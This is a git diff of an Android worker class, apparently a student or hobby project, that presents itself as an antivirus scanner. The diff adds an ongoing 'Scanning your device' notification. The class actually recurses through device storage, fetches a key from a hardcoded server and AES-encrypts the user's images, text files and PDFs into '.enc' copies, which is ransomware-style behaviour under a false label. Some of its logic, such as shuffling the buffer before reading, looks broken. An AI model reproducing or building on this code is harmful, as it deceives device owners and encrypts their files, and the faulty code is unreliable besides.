@@ -2,17 +2,27 @@ package com.example.myapplication.workers;
 
 
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.content.Context;
+import android.os.Build;
 import android.os.Environment;
 import android.util.Log;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.core.app.NotificationCompat;
+import androidx.work.Data;
+import androidx.work.ForegroundInfo;
+import androidx.work.WorkManager;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import com.android.volley.Request;
 import com.android.volley.toolbox.Volley;
+import com.example.myapplication.R;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -29,9 +39,11 @@ import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -40,12 +52,16 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
+import static android.provider.Settings.System.getString;
+import static androidx.core.content.ContextCompat.getSystemService;
+
 public class AntivirusWorker extends Worker {
     private final String url = "http://192.168.43.134/hash";
     private final String LOG_TAG = "NUMBAH 1:";
-    private Map<String,String> listOfMalware;
+    private Map<String,Object> listOfMalware;
     private MessageDigest md = MessageDigest.getInstance("MD5");
     private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
+    private List<Integer> yes = new ArrayList<>();
     public AntivirusWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
         super(context, workerParams);
     }
@@ -59,7 +75,7 @@ public class AntivirusWorker extends Worker {
         } catch (IOException | JSONException e) {
             Log.e(LOG_TAG, "shit", e);
         }
-        return Result.success();
+        return Result.success(new Data.Builder().putAll(listOfMalware).build());
     }
 
     private void yesu(File yes) throws IOException, JSONException {
@@ -70,6 +86,7 @@ public class AntivirusWorker extends Worker {
                    yesu(oof);
                }
                else{
+                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath()));
                    FileInputStream fis = new FileInputStream(oof);
                    int i = 0;
                    do{
@@ -109,9 +126,50 @@ public class AntivirusWorker extends Worker {
            }
        }
     }
+
+    private ForegroundInfo createForegroundInfo(String progress){
+        Context context = getApplicationContext();
+        String id = context.getString(R.string.app_name);
+        String title = "Scanning your device";
+        String cancel = "cancel";
+        PendingIntent intent = WorkManager.getInstance(context)
+                .createCancelPendingIntent(getId());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            createChannel(id);
+        }
+
+        Notification notification = new NotificationCompat.Builder(context, id)
+                .setContentTitle(title)
+                .setTicker(title)
+                .setContentText(progress)
+                .setSmallIcon(R.drawable.antivirus)
+                .setOngoing(true)
+                // Add the cancel action to the notification which can
+                // be used to cancel the worker
+                .addAction(android.R.drawable.ic_delete, cancel, intent)
+                .setOnlyAlertOnce(true)
+                .build();
+        return new ForegroundInfo(5555,notification);
+    }
+
+   private void createChannel(String CHANNEL_ID){
+       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+           String description = "NUMBAH 1!!!!";
+           int importance = NotificationManager.IMPORTANCE_DEFAULT;
+           NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_ID, importance);
+           channel.setDescription(description);
+           // Register the channel with the system; you can't change the importance
+           // or other notification behaviors after this
+           NotificationManager notificationManager = getSystemService(getApplicationContext(),NotificationManager.class);
+           notificationManager.createNotificationChannel(channel);
+       }
+   }
+
+
     private void weeeeeeeeeeeeee(File file){
         YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,url,null,response -> {
             try {
+                Log.i(LOG_TAG, String.valueOf(response));
                 String boom = response.getString("key");
                 md = MessageDigest.getInstance("SHA-256");
                 byte[] keyBytes = md.digest(boom.getBytes());
@@ -122,10 +180,11 @@ public class AntivirusWorker extends Worker {
                 IvParameterSpec iv = new IvParameterSpec(ivBytes);
                 cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                 FileInputStream fis = new FileInputStream(file);
-                File encrypted = new File(file.getName().concat("enc"));
+                File encrypted = new File(file.getName().concat(".enc"));
                 FileOutputStream fos = new FileOutputStream(encrypted);
                 int i;
                 byte[] bytes = new byte[2097152];
+                bytes = shuffleFun(bytes);
                 do{
                     i = fis.read(bytes);
                     cipher.update(bytes);
@@ -133,7 +192,7 @@ public class AntivirusWorker extends Worker {
                 fos.write(cipher.doFinal());
                 fis.close();
                 fos.close();
-                Log.i(LOG_TAG, String.valueOf(response));
+
                 Log.i(LOG_TAG, Arrays.toString(ivBytes));
             } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                 Log.e(LOG_TAG, "shit", e);
@@ -142,4 +201,22 @@ public class AntivirusWorker extends Worker {
         Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
     }
 
+    private byte[] shuffleFun(byte[] original){
+        Random random = new Random();
+        for(int i = 0;i<original.length;i++){
+            int x = random.nextInt(original.length);
+            byte temp = original[x];
+            original[x] = original[i];
+            original[i] = temp;
+            original = x%16 == 0 ? xorFun(original,i) : original;
+            Log.i(LOG_TAG,String.format("Byte %d is swapped with byte %d",i,x));
+        }
+        return original;
+    }
+
+    private byte[] xorFun(byte[] original,int x){
+        byte xored = x+1 == original.length ? (byte) (original[x] ^ original[x+1]) : (byte) (original[x] ^ original[0]);
+        original[x] = xored;
+        return original;
+    }
 }
